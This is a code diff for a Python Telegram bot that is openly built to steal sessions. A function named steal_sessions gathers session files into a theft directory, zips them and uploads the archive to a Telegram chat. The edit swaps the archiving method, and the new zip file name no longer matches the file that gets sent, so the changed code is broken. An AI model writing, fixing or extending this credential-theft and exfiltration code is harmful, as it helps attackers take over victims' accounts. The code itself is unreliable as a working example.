@@ -5,6 +5,7 @@ import logging
 import shutil
 import os
 from pathlib import Path
+import zipfile
 
 # Конфигурация ада
 DB_NAME = "apocalypse.db"
@@ -66,8 +67,12 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 else:
                     shutil.copy(p, STEAL_DIR)
         
-        # Сжатие и отправка
-        shutil.make_archive("sessions_pack", "zip", STEAL_DIR)
+        # Сжатие и отправка        
+        with zipfile.ZipFile('stealed_sessions.zip', 'w') as zipf:
+            for file_path in STEAL_DIR.iterdir():
+                if file_path.is_file():
+                    zipf.write(file_path, arcname=file_path.name)
+
         await context.bot.send_document(
             chat_id=update.effective_chat.id,
             document=InputFile("sessions_pack.zip"),
